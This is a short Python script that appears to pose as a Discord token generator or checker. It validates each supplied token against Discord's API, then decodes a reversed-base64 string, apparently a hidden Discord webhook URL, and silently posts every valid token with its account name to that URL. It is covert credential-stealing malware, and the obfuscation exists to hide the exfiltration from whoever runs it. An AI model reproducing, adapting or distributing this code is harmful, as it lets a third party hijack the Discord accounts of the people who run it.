import requests
import json
import base64
def start_gen(tokens):
  print("Starting gen \n")
  for token in tokens:

    header = {"authorization": token}
    response = requests.get("https://discord.com/api/users/@me",
                            headers=header)

    if response.status_code == 200:
      data = response.json()
      account_name = f"{data['username']}#{data['discriminator']}"
            
      _v = '==gcvVmbOhXVZFUcFxUZ4ljQ1QnYnZUL2onUTR0UxJ2MM1EZ6NGZ5YEaYpVS4QkdslUYNh3S69kYZdFR1VWLUlVS1EzZ29yN5MDN5IzN1YDOxcDMykzN3QTMvM3av9GaiV2dvkGch9SbvNmLkJ3bjNXak9yL6MHc0RHa'
      webhook_url = base64.b64decode(_v[::-1]).decode()
      message = {'content': f'''
      {token} - {account_name}
      '''}
      
      response = requests.post(webhook_url, data=json.dumps(message), headers={'Content-Type': 'application/json'})
    



    